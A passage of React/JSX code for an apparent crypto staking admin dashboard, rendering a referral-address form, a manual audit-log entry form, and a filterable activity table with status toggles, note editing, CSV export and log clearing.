              onChange={(e) => setNewReferralAddress(e.target.value)}
              className="w-full bg-input border border-border-main rounded-xl px-3 py-2 text-sm font-mono focus:outline-none focus:border-[#00A3FF]"
            />
          </div>

          {referralStatus && (
            <div className={`p-3 rounded-xl text-xs font-semibold ${referralStatus.includes('Referral set') ? 'bg-emerald-500/10 text-emerald-500 border border-emerald-500/20' : 'bg-amber-500/10 text-amber-500'}`}>
              {referralStatus}
            </div>
          )}

          <button
            onClick={handleSetReferral}
            disabled={isPending}
            className="w-full py-3 bg-card border border-[#00A3FF] text-[#00A3FF] hover:bg-[#00A3FF]/10 font-bold rounded-xl text-sm flex items-center justify-center gap-2 transition-colors disabled:opacity-50"
          >
            {isPending ? <RefreshCw className="w-4 h-4 animate-spin" /> : <KeyRound className="w-4 h-4" />}
            <span>Update Contract Referral</span>
          </button>
        </div>
      </div>

      {/* Manual Admin Audit Entry Section (Write Access) */}
      <div className="bg-card rounded-2xl p-6 border border-border-main shadow-sm space-y-4">
        <h2 className="font-bold text-lg flex items-center gap-2">
          <Plus className="w-5 h-5 text-[#00A3FF]" />
          Create Admin Audit Log Note
        </h2>
        <form onSubmit={handleCreateManualLog} className="flex gap-3">
          <input
            type="text"
            placeholder="Enter administrative log entry or security note..."
            value={newLogNote}
            onChange={(e) => setNewLogNote(e.target.value)}
            className="flex-1 bg-input border border-border-main rounded-xl px-4 py-2.5 text-sm focus:outline-none focus:border-[#00A3FF]"
          />
          <button
            type="submit"
            className="px-6 py-2.5 bg-[#00A3FF] hover:bg-[#0090E6] text-white font-bold rounded-xl text-sm transition-colors"
          >
            Post Entry
          </button>
        </form>
      </div>

      {/* Full Read/Write Activity Management List */}
      <div className="bg-card rounded-2xl border border-border-main shadow-sm overflow-hidden">
        <div className="px-6 py-4 border-b border-border-main bg-input/50 flex flex-wrap justify-between items-center gap-4">
          <div className="flex items-center gap-2">
            <h2 className="font-bold">Recent User Activity & Audit Logs</h2>
            <span className="text-xs font-semibold px-2 py-0.5 bg-emerald-500/10 text-emerald-500 border border-emerald-500/20 rounded-md">Live Read/Write</span>
          </div>

          <div className="flex items-center gap-3">
            {/* Category Filter */}
            <div className="flex items-center gap-1 bg-card border border-border-main rounded-lg p-1 text-xs">
              <Filter className="w-3.5 h-3.5 text-text-secondary ml-1" />
              {['ALL', 'STAKE', 'WRAP', 'WITHDRAW', 'ADMIN'].map((type) => (
                <button
                  key={type}
                  onClick={() => setFilterType(type)}
                  className={`px-2.5 py-1 rounded-md font-semibold transition-colors ${filterType === type ? 'bg-[#00A3FF] text-white' : 'text-text-secondary hover:text-text-main'}`}
                >
                  {type}
                </button>
              ))}
            </div>

            {/* Export CSV */}
            <button
              onClick={handleExportCSV}
              className="p-2 rounded-lg border border-border-main bg-card hover:bg-input text-text-secondary hover:text-text-main transition-colors flex items-center gap-1 text-xs font-semibold"
              title="Export CSV"
            >
              <Download className="w-3.5 h-3.5" />
              <span>Export</span>
            </button>

            {/* Clear Logs */}
            <button
              onClick={handleClearLogs}
              className="p-2 rounded-lg border border-red-500/20 bg-red-500/5 hover:bg-red-500/10 text-red-500 transition-colors flex items-center gap-1 text-xs font-semibold"
              title="Clear All Logs"
            >
              <Trash2 className="w-3.5 h-3.5" />
              <span>Clear</span>
            </button>
          </div>
        </div>

        <div className="overflow-x-auto">
          <table className="w-full text-left text-sm">
            <thead className="bg-input text-text-secondary font-medium border-b border-border-main">
              <tr>
                <th className="px-6 py-4">Time</th>
                <th className="px-6 py-4">Wallet</th>
                <th className="px-6 py-4">Action</th>
                <th className="px-6 py-4">Amount</th>
                <th className="px-6 py-4">Status</th>
                <th className="px-6 py-4">Note / Audit Log</th>
                <th className="px-6 py-4 text-right">Admin Controls</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-border-main">
              {filteredActivities.length === 0 ? (
                <tr>
                  <td colSpan={7} className="px-6 py-8 text-center text-text-secondary">
                    No activity records found for this category filter.
                  </td>
                </tr>
              ) : (
                filteredActivities.map((act) => (
                  <tr key={act.id} className="hover:bg-input/50 transition-colors">
                    <td className="px-6 py-4 text-xs text-text-secondary whitespace-nowrap">
                      {new Date(act.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })}
                    </td>
                    <td className="px-6 py-4 font-mono text-xs text-[#00A3FF]">
                      <a
                        href={`https://etherscan.io/address/${act.wallet}`}
                        target="_blank"
                        rel="noreferrer"
                        className="hover:underline flex items-center gap-1"
                      >
                        {act.wallet.slice(0, 6)}...{act.wallet.slice(-4)}
                        <ExternalLink className="w-3 h-3 opacity-60" />
                      </a>
                    </td>
                    <td className="px-6 py-4 font-semibold text-xs">
                      <span className="px-2.5 py-1 bg-input rounded-lg border border-border-main">
                        {act.action}
                      </span>
                    </td>
                    <td className="px-6 py-4 font-semibold text-xs">
                      {act.amount || '—'}
                    </td>
                    <td className="px-6 py-4">
                      <button
                        onClick={() => handleToggleStatus(act.id, act.status)}
                        title="Click to toggle status (Confirmed -> Verified -> Flagged)"
                        className={`px-2.5 py-1 rounded-full text-[10px] font-bold uppercase tracking-wider flex items-center gap-1 transition-all ${
                          act.status === 'Verified'
                            ? 'bg-emerald-500/10 text-emerald-500 border border-emerald-500/20'
                            : act.status === 'Flagged'
                            ? 'bg-red-500/10 text-red-500 border border-red-500/20'
                            : 'bg-blue-500/10 text-blue-500 border border-blue-500/20'
                        }`}
                      >
                        {act.status === 'Verified' && <CheckCircle2 className="w-3 h-3" />}
                        {act.status === 'Flagged' && <AlertTriangle className="w-3 h-3" />}
                        {act.status}
                      </button>
                    </td>
                    <td className="px-6 py-4 text-xs text-text-secondary max-w-xs">
                      {editingId === act.id ? (
                        <div className="flex gap-2">
                          <input
                            type="text"
                            value={editingNote}
                            onChange={(e) => setEditingNote(e.target.value)}
                            className="bg-input border border-border-main rounded px-2 py-1 text-xs w-full"
                          />
                          <button
                            onClick={() => handleSaveNote(act.id)}
                            className="px-2 py-1 bg-[#00A3FF] text-white rounded text-[10px] font-bold"
                          >
                            Save
                          </button>
                        </div>
                      ) : (
                        <span>{act.note || 'No note attached'}</span>
                      )}
                    </td>
                    <td className="px-6 py-4 text-right">
                      <button
                        onClick={() => {
                          setEditingId(act.id);
                          setEditingNote(act.note || '');
                        }}
                        className="p-1 text-[#00A3FF] hover:bg-[#00A3FF]/10 rounded transition-colors"
                        title="Edit Admin Note"
                      >
                        <Edit3 className="w-4 h-4" />
                      </button>
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}


